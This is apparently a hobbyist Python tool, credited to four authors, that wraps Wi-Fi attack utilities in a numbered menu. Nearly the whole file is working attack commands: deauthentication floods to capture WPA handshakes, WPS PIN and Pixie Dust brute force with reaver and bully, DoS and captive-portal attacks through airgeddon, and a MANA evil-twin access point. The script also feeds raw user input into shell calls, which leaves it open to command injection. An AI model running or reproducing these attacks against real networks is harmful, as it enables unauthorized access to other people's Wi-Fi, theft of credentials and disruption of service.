#!/usr/bin/env python3
import os
import subprocess
from subprocess import check_call
print("\nInstalling Needed Tools")
print("\n")
cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite bettercap wifipumpkin3")
cmd  = os.system("sleep 3 && clear")
def intro():
    cmd  = os.system("clear")
    print("""\033[1;25m


   ▄████████    ▄████████ ███▄▄▄▄       ███      ▄█  ███▄▄▄▄      ▄████████  ▄█              ▄████████ ▄██   ▄      ▄████████ 
  ███    ███   ███    ███ ███▀▀▀██▄ ▀█████████▄ ███  ███▀▀▀██▄   ███    ███ ███             ███    ███ ███   ██▄   ███    ███ 
  ███    █▀    ███    █▀  ███   ███    ▀███▀▀██ ███▌ ███   ███   ███    █▀  ███             ███    █▀  ███▄▄▄███   ███    █▀  
  ███         ▄███▄▄▄     ███   ███     ███   ▀ ███▌ ███   ███  ▄███▄▄▄     ███            ▄███▄▄▄     ▀▀▀▀▀▀███  ▄███▄▄▄     
▀███████████ ▀▀███▀▀▀     ███   ███     ███     ███▌ ███   ███ ▀▀███▀▀▀     ███           ▀▀███▀▀▀     ▄██   ███ ▀▀███▀▀▀     
         ███   ███    █▄  ███   ███     ███     ███  ███   ███   ███    █▄  ███             ███    █▄  ███   ███   ███    █▄  
   ▄█    ███   ███    ███ ███   ███     ███     ███  ███   ███   ███    ███ ███▌    ▄       ███    ███ ███   ███   ███    ███ 
 ▄████████▀    ██████████  ▀█   █▀     ▄████▀   █▀    ▀█   █▀    ██████████ █████▄▄██       ██████████  ▀█████▀    ██████████ 
                                                                            ▀                                                                                                                                                      
Authors  : AKASH|ASWIN|SUDEV|SARATH
-------------------------------------------------------------------------  
(1)Start monitor mode       
(2)Stop monitor mode
(3)Scan Networks                            
(4)Getting Handshake(monitor mode needed)                                       
(5)WPS Networks attacks (Bssid,monitor mode needed)
(6)Scan for WPS Networks
(7)DOS Attacks
(8)Captive Portal
(9)Evil Twin
(10)Advanced Monitoring

(0)About Our Team
(00)Exit
----------------------------------------------------------------------- """)
    print("\nEnter your choise here : !# ")
    var = int(input(""))
    if var == 1 :
        print("\nEnter the interface:(Default(wlan0/wlan1))")
        interface = input("")
        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 2 :
        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
        interface = input("")
        order = "airmon-ng stop {} && service network-manager restart".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 3 :
        print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
        interface = input("")
        order = "airodump-ng {} -M".format(interface)
        print("When Done Press CTRL+c")
        cmd = os.system("sleep 3")
        geny  = os.system(order)
        cmd = os.system("sleep 10")
        intro()
    
    elif var == 4 :
        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
        interface = input("")
        order     = "airodump-ng {} -M".format(interface)
        print("\nWhen Done Press CTRL+c")
        print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
        print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
        print("\nyou Can use 's' to arrange networks")
        cmd       = os.system("sleep 7")
        geny      = os.system(order)
        print("\nEnter the bssid of the target?")
        bssid     = str(input(""))
        print("\nEnter the channel of the network?")
        channel   = int(input())
        print("Enter the path of the output file ?")
        path = str(input(""))
        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
        print("the number of the packets Depends on the Distance Between you and the network")
        dist = int(input(""))
        order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
        geny = os.system(order)
        intro()
    elif var == 0 :
    
        cmd = os.system("clear")
        print("""
Hi.
This is Our Team
""")
        quit()
    elif var == 00:
        exit()    
        
    elif var == 5:
        cmd = os.system("clear")
        print("""
1)Reaver
2)Bully
3)wifite (Recommeneded)
4)PixieWps
5)wp3 
0) Back to Main Menu
""")
        print("Choose the kind of the attack(External WIFI Adapter Require) ?")
        attack = int(input(""))
        if attack == 1:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            order = ("reaver -i {} -b {} -vv").format(interface,bssid)
            geny = os.system(order)
            intro()
        elif attack == 2:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            print("\nEnter the channel of the network ?")
            channel = int(input(""))
            order = ("bully -b {} -c {} --pixiewps {}").format(bssid,channel,interface)
            geny = os.system(order)
            intro()
        elif attack == 3:
            cmd = os.system("wifite")
            intro()
        elif attack == 4:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            order = ("reaver -i {} -b {} -K").format(interface,bssid)
            geny = os.system(order)
	
        elif attack == 0 :
            intro()
    elif var == 6:
        print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
        interface = str(input(""))
        order = "airodump-ng -M --wps {}".format(interface)
        geny = os.system(order)
        cmd = os.system("sleep 5 ")
        intro()
    elif var == 7:
            cmd = os.system("airgeddon")
            intro()
    elif var == 8:
            cmd = os.system("airgeddon")
            intro()
    elif var == 9:
            cmd = os.system("berate_ap --mana wlan0 eth0 free_wifi")
            intro()
    elif var == 10:
            cmd = os.system("angryoxide -i wlan0 --nodeauth --notransmit")
            intro()
    else:
        print("Not Found")
        cmd = os.system("sleep 2")
        intro()
intro() 
